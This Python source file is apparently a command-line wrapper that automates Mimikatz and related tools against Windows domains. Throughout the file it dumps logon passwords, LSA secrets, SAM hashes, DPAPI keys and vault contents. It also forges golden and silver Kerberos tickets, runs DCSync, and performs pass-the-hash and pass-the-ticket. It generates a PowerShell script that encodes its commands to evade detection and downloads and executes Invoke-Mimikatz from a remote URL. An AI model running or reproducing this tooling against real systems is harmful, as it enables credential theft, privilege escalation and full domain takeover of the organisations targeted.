#!/usr/bin/env python3
import argparse
import subprocess
import os
import sys
import json
import re
import base64
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple

from utils import Colors, Logger, execute_command, save_results

# Import shared configuration
try:
    from config import (
        TARGETS, DOMAIN_USERS, DOMAIN_PASSWORDS, NTLM_HASHES,
        LOG_DIRECTORY, RESULTS_DIRECTORY
    )
except ImportError:
    print("Error: config.py not found. Please ensure it exists in the current directory.")
    sys.exit(1)

class MimikatzWrapper:
    def __init__(self):
        self.results_dir = Path(RESULTS_DIRECTORY) / "mimikatz"
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.start_time = None
        self.end_time = None
        
        # Check if mimikatz is available
        self.mimikatz_path = self._find_mimikatz()
        self.keko_path = self._find_keko()
        
        # PowerShell script path for remote execution
        self.ps_scripts_dir = Path("scripts")
        self.ps_scripts_dir.mkdir(parents=True, exist_ok=True)
        
    def _find_mimikatz(self) -> Optional[Path]:
        """Find mimikatz binary in common locations"""
        # Common locations to search for mimikatz
        script_dir = Path(__file__).parent.absolute()
        mimikatz_locations = [
            script_dir / "mimikatz.exe",
            script_dir / "mimikatz" / "mimikatz.exe",
            script_dir / "tools" / "mimikatz.exe",
            script_dir.parent / "mimikatz" / "mimikatz.exe",
            script_dir.parent / "tools" / "mimikatz.exe",
            "mimikatz.exe",
            "mimikatz/mimikatz.exe",
            "tools/mimikatz.exe",
            "../mimikatz/mimikatz.exe",
            "../tools/mimikatz.exe",
            # Add Windows search paths
            Path("C:/") / "tools" / "mimikatz.exe",
            Path(os.environ.get('USERPROFILE', '')) / "tools" / "mimikatz.exe"
        ]
        
        # Check if the tool is in PATH
        try:
            result = subprocess.run("where mimikatz.exe 2>nul", shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                path = Path(result.stdout.strip())
                Logger.success(f"Found mimikatz in PATH at: {path}")
                return path
        except Exception:
            pass
        
        # Check in common locations
        for location in mimikatz_locations:
            if location.exists():
                Logger.success(f"Found mimikatz at: {location.absolute()}")
                return location.absolute()
        
        Logger.warning("Mimikatz binary not found. Some local functions may not work.")
        return None
    
    def _find_keko(self) -> Optional[Path]:
        """Find kekeo binary in common locations"""
        # Common locations to search for kekeo
        script_dir = Path(__file__).parent.absolute()
        kekeo_locations = [
            script_dir / "kekeo.exe",
            script_dir / "kekeo" / "kekeo.exe",
            script_dir / "tools" / "kekeo.exe",
            script_dir.parent / "kekeo" / "kekeo.exe",
            script_dir.parent / "tools" / "kekeo.exe",
            "kekeo.exe",
            "kekeo/kekeo.exe",
            "tools/kekeo.exe",
            "../kekeo/kekeo.exe",
            "../tools/kekeo.exe",
            # Add Windows search paths
            Path("C:/") / "tools" / "kekeo.exe",
            Path(os.environ.get('USERPROFILE', '')) / "tools" / "kekeo.exe"
        ]
        
        # Check if the tool is in PATH
        try:
            result = subprocess.run("where kekeo.exe 2>nul", shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                path = Path(result.stdout.strip())
                Logger.success(f"Found kekeo in PATH at: {path}")
                return path
        except Exception:
            pass
        
        # Check in common locations
        for location in kekeo_locations:
            if location.exists():
                Logger.success(f"Found kekeo at: {location.absolute()}")
                return location.absolute()
        
        Logger.warning("Kekeo binary not found. Some ticket-related functions may not work.")
        return None
    
    def execute_command(self, command: str, description: str) -> str:
        """Execute a shell command and return its output"""
        try:
            Logger.command(command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            Logger.error(f"Error executing command: {str(e)}")
            return str(e)
    
    def save_results(self, target: str, output: str, operation: str) -> Path:
        """Save command results to a file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('.', '_')}_{operation}_{timestamp}.txt"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(output)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def create_powershell_mimikatz_script(self, commands: List[str]) -> Path:
        """Create a PowerShell script that runs mimikatz commands"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"mimikatz_remote_{timestamp}.ps1"
        filepath = self.ps_scripts_dir / filename
        
        # Base64 encode mimikatz commands to avoid detection
        commands_str = ";" .join(commands)
        encoded_commands = base64.b64encode(commands_str.encode('utf-16-le')).decode()
        
        # Create PowerShell script that downloads Invoke-Mimikatz and runs commands
        script_content = f"""
# PowerShell script to run Mimikatz commands
$ErrorActionPreference = "SilentlyContinue"
$commands = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("{encoded_commands}"))

# Download Invoke-Mimikatz if not available
if (-not (Get-Command Invoke-Mimikatz -ErrorAction SilentlyContinue)) {{
    Write-Output "Downloading Invoke-Mimikatz..."
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
}}

# Run Mimikatz with provided commands
$result = Invoke-Mimikatz -Command $commands
$result | Out-String -Width 4096
"""
        
        with open(filepath, 'w') as f:
            f.write(script_content)
        
        Logger.success(f"Created PowerShell Mimikatz script at: {filepath}")
        return filepath
    
    def execute_mimikatz_locally(self, commands: List[str], description: str) -> str:
        """Execute mimikatz locally with the given commands"""
        if not self.mimikatz_path:
            Logger.error("Mimikatz binary not found. Cannot execute locally.")
            return ""
        
        # Create batch file with mimikatz commands
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        batch_file = self.results_dir / f"mimikatz_commands_{timestamp}.bat"
        
        with open(batch_file, 'w') as f:
            f.write(f'@echo off\n"{self.mimikatz_path}" ')
            for cmd in commands:
                f.write(f'"{cmd}" ')
            f.write('"exit"\n')
        
        # Execute the batch file
        output = self.execute_command(f"{batch_file}", f"Executing Mimikatz {description}")
        
        # Clean up the batch file
        try:
            os.remove(batch_file)
        except:
            pass
        
        return output
    
    def execute_mimikatz_remotely(self, target: str, username: str, password: str, commands: List[str], description: str) -> str:
        """Execute mimikatz on a remote system using PowerShell remoting"""
        # Create PowerShell script with mimikatz commands
        ps_script = self.create_powershell_mimikatz_script(commands)
        
        # Execute PowerShell script on remote system
        ps_command = f"powershell -ep bypass -command \"$pw = ConvertTo-SecureString '{password}' -AsPlainText -Force; "
        ps_command += f"$cred = New-Object System.Management.Automation.PSCredential('{username}', $pw); "
        ps_command += f"Invoke-Command -ComputerName {target} -Credential $cred -FilePath '{ps_script}'\""
        
        output = self.execute_command(ps_command, f"Executing Mimikatz remotely on {target}: {description}")
        return output
    
    def dump_credentials_local(self) -> Dict[str, Any]:
        """Dump credentials from the local system"""
        Logger.section("Dumping Credentials from Local System")
        
        results = {
            "logonpasswords": None,
            "lsa": None,
            "sam": None,
            "dpapi": None,
            "vault": None
        }
        
        # Sekurlsa::logonpasswords
        Logger.subsection("Dumping Logon Passwords")
        logonpasswords_output = self.execute_mimikatz_locally(
            ["privilege::debug", "sekurlsa::logonpasswords"],
            "Dumping logon passwords"
        )
        results["logonpasswords"] = self.save_results("local", logonpasswords_output, "logonpasswords")
        
        # LSA secrets
        Logger.subsection("Dumping LSA Secrets")
        lsa_output = self.execute_mimikatz_locally(
            ["privilege::debug", "lsadump::lsa /patch"],
            "Dumping LSA secrets"
        )
        results["lsa"] = self.save_results("local", lsa_output, "lsa")
        
        # SAM database
        Logger.subsection("Dumping SAM Database")
        sam_output = self.execute_mimikatz_locally(
            ["privilege::debug", "lsadump::sam"],
            "Dumping SAM database"
        )
        results["sam"] = self.save_results("local", sam_output, "sam")
        
        # DPAPI credentials
        Logger.subsection("Extracting DPAPI Master Keys")
        dpapi_output = self.execute_mimikatz_locally(
            ["privilege::debug", "sekurlsa::dpapi"],
            "Extracting DPAPI master keys"
        )
        results["dpapi"] = self.save_results("local", dpapi_output, "dpapi")
        
        # Windows Vault
        Logger.subsection("Dumping Windows Vault")
        vault_output = self.execute_mimikatz_locally(
            ["privilege::debug", "vault::list"],
            "Dumping Windows Vault"
        )
        results["vault"] = self.save_results("local", vault_output, "vault")
        
        return results
    
    def dump_credentials_remote(self, target: str, username: str, password: str) -> Dict[str, Any]:
        """Dump credentials from a remote system"""
        Logger.section(f"Dumping Credentials from Remote System: {target}")
        
        results = {
            "target": target,
            "username": username,
            "logonpasswords": None,
            "lsa": None,
            "sam": None
        }
        
        # Sekurlsa::logonpasswords
        Logger.subsection("Dumping Logon Passwords")
        logonpasswords_output = self.execute_mimikatz_remotely(
            target, username, password,
            ["privilege::debug", "sekurlsa::logonpasswords"],
            "Dumping logon passwords"
        )
        results["logonpasswords"] = self.save_results(target, logonpasswords_output, "logonpasswords")
        
        # LSA secrets
        Logger.subsection("Dumping LSA Secrets")
        lsa_output = self.execute_mimikatz_remotely(
            target, username, password,
            ["privilege::debug", "lsadump::lsa /patch"],
            "Dumping LSA secrets"
        )
        results["lsa"] = self.save_results(target, lsa_output, "lsa")
        
        # SAM database
        Logger.subsection("Dumping SAM Database")
        sam_output = self.execute_mimikatz_remotely(
            target, username, password,
            ["privilege::debug", "lsadump::sam"],
            "Dumping SAM database"
        )
        results["sam"] = self.save_results(target, sam_output, "sam")
        
        return results
    
    def extract_tickets_local(self) -> Dict[str, Any]:
        """Extract Kerberos tickets from the local system"""
        Logger.section("Extracting Kerberos Tickets from Local System")
        
        results = {
            "tickets": None,
            "tgt": None
        }
        
        # List all tickets
        Logger.subsection("Listing Kerberos Tickets")
        tickets_output = self.execute_mimikatz_locally(
            ["privilege::debug", "kerberos::list"],
            "Listing Kerberos tickets"
        )
        results["tickets"] = self.save_results("local", tickets_output, "kerberos_tickets")
        
        # Extract TGT for current user
        Logger.subsection("Extracting TGT")
        tgt_output = self.execute_mimikatz_locally(
            ["privilege::debug", "kerberos::tgt"],
            "Extracting TGT"
        )
        results["tgt"] = self.save_results("local", tgt_output, "kerberos_tgt")
        
        return results
    
    def extract_tickets_remote(self, target: str, username: str, password: str) -> Dict[str, Any]:
        """Extract Kerberos tickets from a remote system"""
        Logger.section(f"Extracting Kerberos Tickets from Remote System: {target}")
        
        results = {
            "target": target,
            "username": username,
            "tickets": None
        }
        
        # List all tickets
        Logger.subsection("Listing Kerberos Tickets")
        tickets_output = self.execute_mimikatz_remotely(
            target, username, password,
            ["privilege::debug", "kerberos::list"],
            "Listing Kerberos tickets"
        )
        results["tickets"] = self.save_results(target, tickets_output, "kerberos_tickets")
        
        return results
    
    def create_golden_ticket(self, domain: str, domain_sid: str, krbtgt_hash: str, username: str = "Administrator", user_id: str = "500") -> Dict[str, Any]:
        """Create a Golden Ticket"""
        Logger.section(f"Creating Golden Ticket for Domain: {domain}")
        
        results = {
            "domain": domain,
            "username": username,
            "user_id": user_id,
            "golden_ticket": None
        }
        
        # Using mimikatz to create golden ticket
        Logger.subsection("Generating Golden Ticket")
        golden_output = self.execute_mimikatz_locally(
            [
                "privilege::debug",
                f"kerberos::golden /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /user:{username} /id:{user_id} /ptt"
            ],
            "Creating and injecting Golden Ticket"
        )
        results["golden_ticket"] = self.save_results(domain, golden_output, "golden_ticket")
        
        return results
    
    def create_silver_ticket(self, domain: str, domain_sid: str, target_hash: str, service: str, target: str, username: str = "Administrator", user_id: str = "500") -> Dict[str, Any]:
        """Create a Silver Ticket"""
        Logger.section(f"Creating Silver Ticket for Service: {service} on {target}")
        
        results = {
            "domain": domain,
            "username": username,
            "user_id": user_id,
            "service": service,
            "target": target,
            "silver_ticket": None
        }
        
        # Using mimikatz to create silver ticket
        Logger.subsection("Generating Silver Ticket")
        silver_output = self.execute_mimikatz_locally(
            [
                "privilege::debug",
                f"kerberos::golden /domain:{domain} /sid:{domain_sid} /target:{target} /service:{service} /rc4:{target_hash} /user:{username} /id:{user_id} /ptt"
            ],
            "Creating and injecting Silver Ticket"
        )
        results["silver_ticket"] = self.save_results(f"{target}_{service}", silver_output, "silver_ticket")
        
        return results
    
    def pass_the_hash(self, target: str, domain: str, username: str, ntlm_hash: str, command: str) -> Dict[str, Any]:
        """Perform Pass-the-Hash attack"""
        Logger.section(f"Executing Pass-the-Hash Attack against: {target}")
        
        results = {
            "target": target,
            "domain": domain,
            "username": username,
            "command": command,
            "output": None
        }
        
        # Use pth-winexe or Impacket's wmiexec for Pass-the-Hash
        Logger.subsection(f"Running command: {command}")
        
        # First try pth-winexe if it exists
        pth_output = self.execute_command(
            f"pth-winexe -U {domain}/{username}%aad3b435b51404eeaad3b435b51404ee:{ntlm_hash} //{target} '{command}'",
            "Executing command via pth-winexe"
        )
        
        # If pth-winexe fails, try Impacket's wmiexec
        if "is not recognized as" in pth_output or "command not found" in pth_output:
            Logger.info("pth-winexe not found, trying Impacket's wmiexec.py...")
            pth_output = self.execute_command(
                f"wmiexec.py {domain}/{username}@{target} -hashes aad3b435b51404eeaad3b435b51404ee:{ntlm_hash} '{command}'",
                "Executing command via wmiexec.py"
            )
        
        results["output"] = self.save_results(target, pth_output, "pass_the_hash")
        
        return results
    
    def pass_the_ticket(self, target: str, command: str) -> Dict[str, Any]:
        """Perform Pass-the-Ticket attack (requires a ticket to be already injected)"""
        Logger.section(f"Executing Pass-the-Ticket Attack against: {target}")
        
        results = {
            "target": target,
            "command": command,
            "output": None
        }
        
        # First ensure we have tickets injected
        tickets_output = self.execute_mimikatz_locally(
            ["privilege::debug", "kerberos::list"],
            "Checking for available tickets"
        )
        
        if "0 ticket(s)" in tickets_output:
            Logger.error("No Kerberos tickets available. Inject a ticket first.")
            return results
        
        # Execute command with kerberos authentication
        Logger.subsection(f"Running command: {command}")
        
        # Try to use Impacket's pth-smbclient or another tool supporting Kerberos
        ptt_output = self.execute_command(
            f"smbclient.py '{target}' -k '{command}'",
            "Executing command with Kerberos authentication"
        )
        
        results["output"] = self.save_results(target, ptt_output, "pass_the_ticket")
        
        return results
    
    def dcsync(self, domain: str, domain_controller: str, username: str = None) -> Dict[str, Any]:
        """Perform DCSync attack to extract password hashes"""
        Logger.section(f"Executing DCSync Attack against: {domain_controller}")
        
        results = {
            "domain": domain,
            "domain_controller": domain_controller,
            "target_user": username,
            "output": None
        }
        
        # Execute DCSync
        dcsync_cmd = ["privilege::debug", "lsadump::dcsync /domain:{domain}"]
        
        if username:
            Logger.subsection(f"Extracting hash for user: {username}")
            dcsync_cmd.append(f"/user:{username}")
        else:
            Logger.subsection("Extracting all domain hashes")
            dcsync_cmd.append("/all")
        
        dcsync_output = self.execute_mimikatz_locally(
            dcsync_cmd,
            "Performing DCSync attack"
        )
        
        results["output"] = self.save_results(domain_controller, dcsync_output, "dcsync")
        
        return results
    
    def parse_credentials(self, output: str) -> List[Dict[str, str]]:
        """Parse mimikatz output to extract credentials"""
        credentials = []
        
        # Regular expressions for different credential formats
        patterns = {
            "wdigest": r'wdigest\s*:\s*\*\s*Username\s*:\s*([^\r\n]*)\s*Domain\s*:\s*([^\r\n]*)\s*Password\s*:\s*([^\r\n]*)',
            "kerberos": r'kerberos\s*:\s*\*\s*Username\s*:\s*([^\r\n]*)\s*Domain\s*:\s*([^\r\n]*)\s*Password\s*:\s*([^\r\n]*)',
            "tspkg": r'tspkg\s*:\s*\*\s*Username\s*:\s*([^\r\n]*)\s*Domain\s*:\s*([^\r\n]*)\s*Password\s*:\s*([^\r\n]*)',
            "lsa": r'Domain\s*:\s*([^\r\n]*)\s*SID\s*:[^\r\n]*\s*User\s*:\s*([^\r\n]*)\s*\*\s*Primary\s*[^\r\n]*\s*NTLM\s*:\s*([^\r\n]*)',
            "dpapi": r'GUID\s*:\s*\{([^\}]*)\}\s*MasterKey\s*:\s*([^\r\n]*)\s*sha1\s*:\s*([^\r\n]*)'
        }
        
        # Extract credentials using patterns
        for cred_type, pattern in patterns.items():
            matches = re.finditer(pattern, output, re.MULTILINE)
            for match in matches:
                if cred_type in ["wdigest", "kerberos", "tspkg"]:
                    username, domain, password = match.groups()
                    credentials.append({
                        "type": cred_type,
                        "username": username.strip(),
                        "domain": domain.strip(),
                        "password": password.strip(),
                        "hash": None
                    })
                elif cred_type == "lsa":
                    domain, username, ntlm = match.groups()
                    credentials.append({
                        "type": cred_type,
                        "username": username.strip(),
                        "domain": domain.strip(),
                        "password": None,
                        "hash": ntlm.strip()
                    })
                elif cred_type == "dpapi":
                    guid, masterkey, sha1 = match.groups()
                    credentials.append({
                        "type": "dpapi",
                        "id": guid.strip(),
                        "masterkey": masterkey.strip(),
                        "sha1": sha1.strip(),
                        "username": None,
                        "domain": None
                    })
        
        return credentials
    
    def run_all_local(self) -> Dict[str, Any]:
        """Run all local credential extraction techniques"""
        Logger.section("Comprehensive Local Credential Extraction")
        
        results = {
            "start_time": str(datetime.now()),
            "credentials": [],
            "ticket_extraction": None,
            "credential_dump": None
        }
        
        # Extract tickets
        ticket_results = self.extract_tickets_local()
        results["ticket_extraction"] = ticket_results
        
        # Dump credentials
        cred_results = self.dump_credentials_local()
        results["credential_dump"] = cred_results
        
        # Parse credential output files to extract credentials
        for output_type, output_file in cred_results.items():
            if output_file:
                try:
                    with open(output_file, 'r') as f:
                        output = f.read()
                        parsed_creds = self.parse_credentials(output)
                        for cred in parsed_creds:
                            if cred not in results["credentials"]:
                                results["credentials"].append(cred)
                except Exception as e:
                    Logger.error(f"Error parsing credentials from {output_file}: {str(e)}")
        
        # Save comprehensive results
        results["end_time"] = str(datetime.now())
        summary_file = self.results_dir / f"local_extraction_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(summary_file, 'w') as f:
            json.dump(results, f, indent=4)
        
        Logger.success(f"Comprehensive results saved to {summary_file}")
        Logger.success(f"Found {len(results['credentials'])} unique credentials")
        
        return results
    
    def run_remote(self, targets: List[str], domain: str, username: str, password: str = None, ntlm_hash: str = None) -> Dict[str, Any]:
        """Run credential extraction against remote targets"""
        Logger.section("Remote Credential Extraction")
        
        all_results = {
            "start_time": str(datetime.now()),
            "targets": targets,
            "domain": domain,
            "username": username,
            "target_results": []
        }
        
        for target in targets:
            Logger.section(f"Target: {target}")
            
            target_results = {
                "target": target,
                "success": False,
                "credential_dump": None,
                "ticket_extraction": None,
                "credentials": []
            }
            
            # Authenticate with password if provided, otherwise use hash
            if password:
                # Dump credentials
                cred_results = self.dump_credentials_remote(target, username, password)
                target_results["credential_dump"] = cred_results
                
                # Extract tickets
                ticket_results = self.extract_tickets_remote(target, username, password)
                target_results["ticket_extraction"] = ticket_results
                
                target_results["success"] = True
            elif ntlm_hash:
                # Use pass-the-hash to execute mimikatz commands
                Logger.info(f"Using pass-the-hash with NTLM hash: {ntlm_hash}")
                
                # Create PowerShell script with encoded mimikatz commands
                ps_script = self.create_powershell_mimikatz_script(
                    ["privilege::debug", "sekurlsa::logonpasswords", "exit"]
                )
                
                # Execute the script via pass-the-hash
                pth_results = self.pass_the_hash(
                    target, domain, username, ntlm_hash,
                    f"powershell.exe -ExecutionPolicy Bypass -File {ps_script}"
                )
                
                if pth_results["output"]:
                    target_results["credential_dump"] = {"logonpasswords": pth_results["output"]}
                    target_results["success"] = True
            
            # Parse credential output files to extract credentials
            if target_results["credential_dump"]:
                for output_type, output_file in target_results["credential_dump"].items():
                    if output_file and output_type != "target" and output_type != "username":
                        try:
                            with open(output_file, 'r') as f:
                                output = f.read()
                                parsed_creds = self.parse_credentials(output)
                                for cred in parsed_creds:
                                    if cred not in target_results["credentials"]:
                                        target_results["credentials"].append(cred)
                        except Exception as e:
                            Logger.error(f"Error parsing credentials from {output_file}: {str(e)}")
            
            all_results["target_results"].append(target_results)
        
        # Save comprehensive results
        all_results["end_time"] = str(datetime.now())
        summary_file = self.results_dir / f"remote_extraction_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(summary_file, 'w') as f:
            json.dump(all_results, f, indent=4)
        
        Logger.success(f"Comprehensive results saved to {summary_file}")
        
        # Count total credentials found
        total_creds = sum(len(target["credentials"]) for target in all_results["target_results"])
        Logger.success(f"Found {total_creds} unique credentials across {len(targets)} targets")
        
        return all_results

def main():
    parser = argparse.ArgumentParser(description=f'{Colors.BOLD}Mimikatz Automation Wrapper{Colors.ENDC}')
    
    # Main command subparsers
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Local commands
    local_parser = subparsers.add_parser('local', help='Run Mimikatz locally')
    local_subparsers = local_parser.add_subparsers(dest='local_command', help='Local command to execute')
    
    local_all_parser = local_subparsers.add_parser('all', help='Run all local extraction techniques')
    
    local_creds_parser = local_subparsers.add_parser('creds', help='Dump credentials locally')
    
    local_tickets_parser = local_subparsers.add_parser('tickets', help='Extract Kerberos tickets locally')
    
    # Golden/Silver ticket commands
    golden_parser = local_subparsers.add_parser('golden', help='Create a Golden Ticket')
    golden_parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., contoso.local)')
    golden_parser.add_argument('-s', '--sid', required=True, help='Domain SID')
    golden_parser.add_argument('-k', '--krbtgt', required=True, help='KRBTGT account hash')
    golden_parser.add_argument('-u', '--user', default='Administrator', help='User to impersonate (default: Administrator)')
    golden_parser.add_argument('-i', '--id', default='500', help='User ID (default: 500)')
    
    silver_parser = local_subparsers.add_parser('silver', help='Create a Silver Ticket')
    silver_parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., contoso.local)')
    silver_parser.add_argument('-s', '--sid', required=True, help='Domain SID')
    silver_parser.add_argument('-k', '--hash', required=True, help='Service account hash')
    silver_parser.add_argument('-t', '--target', required=True, help='Target server hostname')
    silver_parser.add_argument('-v', '--service', required=True, help='Service type (e.g., cifs, http, ldap)')
    silver_parser.add_argument('-u', '--user', default='Administrator', help='User to impersonate (default: Administrator)')
    silver_parser.add_argument('-i', '--id', default='500', help='User ID (default: 500)')
    
    dcsync_parser = local_subparsers.add_parser('dcsync', help='Perform DCSync attack')
    dcsync_parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., contoso.local)')
    dcsync_parser.add_argument('-c', '--dc', required=True, help='Domain Controller hostname')
    dcsync_parser.add_argument('-u', '--user', help='Specific user to sync (default: all users)')
    
    # Remote commands
    remote_parser = subparsers.add_parser('remote', help='Run Mimikatz remotely')
    remote_parser.add_argument('-t', '--targets', nargs='+', help='Target IP addresses or hostnames')
    remote_parser.add_argument('-d', '--domain', required=True, help='Domain name')
    remote_parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    remote_group = remote_parser.add_mutually_exclusive_group(required=True)
    remote_group.add_argument('-p', '--password', help='Password for authentication')
    remote_group.add_argument('-H', '--hash', help='NTLM hash for authentication (Pass-the-Hash)')
    
    # Pass-the-Hash
    pth_parser = subparsers.add_parser('pth', help='Perform Pass-the-Hash attack')
    pth_parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
    pth_parser.add_argument('-d', '--domain', required=True, help='Domain name')
    pth_parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    pth_parser.add_argument('-H', '--hash', required=True, help='NTLM hash for authentication')
    pth_parser.add_argument('-c', '--command', required=True, help='Command to execute')
    
    # Pass-the-Ticket
    ptt_parser = subparsers.add_parser('ptt', help='Perform Pass-the-Ticket attack (requires existing ticket)')
    ptt_parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
    ptt_parser.add_argument('-c', '--command', required=True, help='Command to execute')
    
    args = parser.parse_args()
    
    wrapper = MimikatzWrapper()
    
    # Handle commands
    if args.command == 'local':
        if args.local_command == 'all':
            wrapper.run_all_local()
        elif args.local_command == 'creds':
            results = wrapper.dump_credentials_local()
            Logger.success("Credential dumping completed. Check saved files for details.")
        elif args.local_command == 'tickets':
            results = wrapper.extract_tickets_local()
            Logger.success("Ticket extraction completed. Check saved files for details.")
        elif args.local_command == 'golden':
            results = wrapper.create_golden_ticket(
                domain=args.domain,
                domain_sid=args.sid,
                krbtgt_hash=args.krbtgt,
                username=args.user,
                user_id=args.id
            )
            Logger.success("Golden Ticket created and injected. Check saved files for details.")
        elif args.local_command == 'silver':
            results = wrapper.create_silver_ticket(
                domain=args.domain,
                domain_sid=args.sid,
                target_hash=args.hash,
                service=args.service,
                target=args.target,
                username=args.user,
                user_id=args.id
            )
            Logger.success("Silver Ticket created and injected. Check saved files for details.")
        elif args.local_command == 'dcsync':
            results = wrapper.dcsync(
                domain=args.domain,
                domain_controller=args.dc,
                username=args.user
            )
            Logger.success("DCSync completed. Check saved files for details.")
    elif args.command == 'remote':
        targets = args.targets or TARGETS
        if not targets:
            Logger.error("No targets specified. Add targets to config.py or provide them as arguments.")
            return
        
        wrapper.run_remote(
            targets=targets,
            domain=args.domain,
            username=args.username,
            password=args.password,
            ntlm_hash=args.hash
        )
    elif args.command == 'pth':
        results = wrapper.pass_the_hash(
            target=args.target,
            domain=args.domain,
            username=args.username,
            ntlm_hash=args.hash,
            command=args.command
        )
        Logger.success("Pass-the-Hash attack completed. Check saved files for details.")
    elif args.command == 'ptt':
        results = wrapper.pass_the_ticket(
            target=args.target,
            command=args.command
        )
        Logger.success("Pass-the-Ticket attack completed. Check saved files for details.")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()